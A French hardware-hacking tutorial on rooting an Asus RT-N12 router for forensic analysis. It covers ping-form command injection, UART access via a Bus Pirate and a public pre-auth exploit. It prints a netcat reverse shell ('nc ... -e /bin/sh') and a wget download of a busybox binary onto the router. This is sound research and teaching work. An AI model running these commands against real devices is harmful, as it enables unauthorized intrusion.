Rooting le rt-n12
#################
:date: 2016-02-04
:category: Reverse
:tags: Hardware, Reverse, Bus pirate, Routeur, Asus
:slug: reverse-rt-n12


Introduction :
~~~~~~~~~~~~~~

AsusTek est une entreprise de création de matériel informatique, téléphonique et réseau. Son routeur RT-N12  est l'objet de cet article. Nous allons ici tenter d'obtenir un shell root sur la bête parce que celui-ci a été compromis. Comme nous ne voulons pas effacer d’éventuelles preuves , nous n'allons pas le flasher.

Le Materiel :
~~~~~~~~~~~~~

Il vous faudra : un PC avec un port Ethernet, votre butineur préféré ainsi qu'une interface UART ( optionnel ).

1 - Attaquer l'interface Web :
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sur tout les routeurs modernes, nous avons une interface Web pour faciliter la configuration de l'engin. Elle sont quasi tout le temps développées "in-house" et présentent souvent des failles de sécurité. Nous allons donc voir ce que nous pouvons tirer de celle de notre routeur.

On trouve immédiatement une interface pour effectuer des ping. Celles-ci appellent tout le temps le shell sous-jacent.On va donc injecter des commandes sur ce menu.

.. image:: thumbnails/Interface-rtn12_thumbnail_square.png
  :target: images/Interface-rtn12.png
  :alt: Interface image

Regardons déjà la sortie standard en "Ciblant" l'IP de notre PC:

.. code-block:: bash

  PING 192.168.1.139 (192.168.1.139): 56 data bytes
  64 bytes from 192.168.1.139: seq=0 ttl=64 time=3.935 ms
  64 bytes from 192.168.1.139: seq=1 ttl=64 time=6.019 ms
  64 bytes from 192.168.1.139: seq=2 ttl=64 time=0.887 ms
  64 bytes from 192.168.1.139: seq=3 ttl=64 time=0.854 ms
  64 bytes from 192.168.1.139: seq=4 ttl=64 time=0.910 ms

  --- 192.168.1.139 ping statistics ---
  5 packets transmitted, 5 packets received, 0% packet loss
  round-trip min/avg/max = 0.854/2.521/6.019 ms


Bon, on a un retour. voyons si nous lui injectons une commande avec $(ls)

.. code-block:: bash

  BusyBox v1.17.4 (2014-11-05 00:29:30 CST) multi-call binary.

  Usage: ping [OPTIONS] HOST

C'est aussi facile ? On dirait bien ! par contre, on a pas de retour, pas grave, on peut continuer à l'aveugle. On a déjà un bon indice, la version de BusyBox ( une "boite à outils" minimale pour linux ).

cette technique n'est cependant pas très pratique à utiliser, nous verrons au point 4 comment la rendre plus joueuse.

2 - Ouvrir la bête :
~~~~~~~~~~~~~~~~~~~~

Pendant son développement, les créateurs du routeur doivent avoir accès à une CLI pour pouvoir le débugger ou pour effectuer des tests. Il y a donc souvent sur les PCB des ports de type SPI, UART ou encore JTAG. Nous pouvons donc utiliser l'un de ces port pour avoir accès aux entrailles du routeur. L'UART est une interface série "en mode low power".  Le Bus Pirate offre entre autre une interface UART. C'est aussi le port le disponible sur la PCB de notre routeur.

Après quelque coups de tournevis , on a accès à la PCB. Il faut tout d'abords identifier le port UART : on le voit entouré sur la photo ( NB: j'y ai rajouté les pins pour un accès plus facile ):

.. image:: thumbnails/UART_thumbnail_square.jpg
  :target: images/UART.jpg
  :alt: Interface image

Cela ne nous renseigne pas sur le câblage des pins. On peut utiliser un outils dédié : le JTAGULATOR, ou alors, le faire à la main.

On va faire ça avec les outils qu'on a à disposition : un multimètre numérique. On va déjà chercher la masse : on prend la masse sur  l'alimentation et on test toutes les pins. lorsque le multimètre en mode "testeur de diode" sonne, c'est qu'on a trouvé la masse ( pin N*3 en partant du haut sur la photo ).

On va ensuite trouver VCC: on recommence la même manipulation qu'avant avec le routeur allumé , mais avec le multimètre en mode voltmètre à la recherche de 3.3V. On découvre que le port n*4 en partant du haut est stable sur 3.3v, c'est donc le Vcc. Les deux autres sont RX et TX, on les identifiera avec le bus pirate. On branche déjà GND ( surtout pas VCC, vous pourriez griller le routeur ET le bus pirate). On branche ensuite le RX et TX sur les pins 1 et 2 . Si lors de l'allumage, le bus pirate détecte quelque chose, c'est que le branchement est correct, sinon, on intervertit RX et TX.

La configuration de l'UART est la suivante :

.. table:: Options UART

  ======= =============== ======= ===========
  Vitesse Bits de données Paritée Bit de stop
  ======= =============== ======= ===========
  115200  8               Non     1
  ======= =============== ======= ===========

Dans l'interface du bus pirate ça donne les commandes suivantes :

.. list-table:: Les commandes du bus pirate :

    * - m
    * - 3
    * - 9
    * - 1
    * - 1
    * - 1
    * - 2
    * - (1) <= cette commande met le bus pirate en mode passif. toute commande envoyé après celle-ci ira sur le port UART.
    * - y

Un p'tit test :

.. code-block:: bash

  / # uname -a
  Linux (none) 2.6.22.19 #1 Wed Nov 5 00:32:32 CST 2014 mips GNU/Linux

Voila, nous avons un shell Root sur le routeur.

3 - Exploit pre-auth:
~~~~~~~~~~~~~~~~~~~~~

On a de la chance : cette version du firmware possède une erreur de programmation qui permet de lancer une commande sans même avoir d’accès au routeur. L'exploit se trouve ici : https://www.exploit-db.com/exploits/35688/

Celui-ci et capable de lancer une commande pre-auth sur le routeur. On le lance avec l'IP du routeur et la commande à effectuer, et voila !

Encore une fois, c'est pas très pratique : on verra comment le rendre plus fun dans le point suivant

4 - Post-rooting:
~~~~~~~~~~~~~~~~~

On a à présent une commande sur le routeur. Mais certaine  de ces techniques ne sont pas très utiles tant que l'on n'a pas encore "rootkité" le routeur. On veut un shell stable et qui fonctionne comme mon shell sur mon linux. Busybox offre dans ses dernières versions un netcat parfaitement fonctionnel avec qui plus est , l'option -e ( pour "plugger" les entrées et sorties standard d'un processus )

On va donc installer une busybox dernière version sur le routeur.

.. list-table:: Les points à effectuer :

  * - Obtenir une meilleur version de busybox
  * - installer celle-ci sur le routeur
  * - Obtenir un reverse shell

Déjà trouver une busybox compatible. Ce sera un MIPS Little Endian. Une version est téléchargeable directement ici : https://www.busybox.net/downloads/binaries/latest/ celle qui nous intéresse est la mipsel. Une fois obtenue, il faut la mettre sur le routeur.

Python possède un outils très puissant : SimpleHTTPServer : dans le même répertoire que la version de busybox fraîchement téléchargée, on exécute :

.. code-block:: bash

  python -m SimpleHTTPServer 80

Ceci va lancer un serveur HTTP , il ne reste plus qu'à la télécharger sur le routeur :
wget http://192.168.1.139/busybox-mipsel -O /tmp/busybox

puis :

.. code-block:: bash

  chmod 777 /tmp/busybox

Nous avons à présent une nouvelle busybox sur le routeur. On va déjà placer un netcat en écoute sur le PC:

.. code-block:: bash

  nc -l -p 1234

Et enfin, dans le shell du routeur :

.. code-block:: bash

  /tmp/busybox nc 192.168.1.139 1234 -e /bin/sh

Un p'tit test :

.. code-block:: bash

  ls -alh
  drwxr-xr-x   10 admin    root        3.5K Nov  4  2014 .
  drwxr-xr-x   18 admin    root         225 Nov  4  2014 ..
  -rw-r--r--    1 admin    root       13.0K Nov  4  2014 Advanced_ACL_Content.asp
  -rw-r--r--    1 admin    root       14.2K Nov  4  2014 Advanced_ASUSDDNS_Content.asp
  -rw-r--r--    1 admin    root        7.8K Nov  4  2014 Advanced_BasicFirewall_Content.asp
  <============== 8<====================>
  -rw-r--r--    1 admin    root       34.6K Nov  4  2014 validator.js
  -rw-r--r--    1 admin    root          38 Nov  4  2014 wds_aplist_2g.asp
  -rw-r--r--    1 admin    root          38 Nov  4  2014 wds_aplist_5g.asp
  -rw-r--r--    1 admin    root          40 Nov  4  2014 wds_aplist_5g_2.asp
  -rw-r--r--    1 admin    root        1.7K Nov  4  2014 wlconn_apply.htm
  lrwxrwxrwx    1 admin    root          18 Nov  4  2014 wpad.dat -> /www/ext/proxy.pac

Et voila, on a un shell à travers le réseau ! on peut à présent déplacer  les binaires avec netcat sur le PC pour les analyser. Nous allons d’ailleurs récupérer infosvr pour analyse.
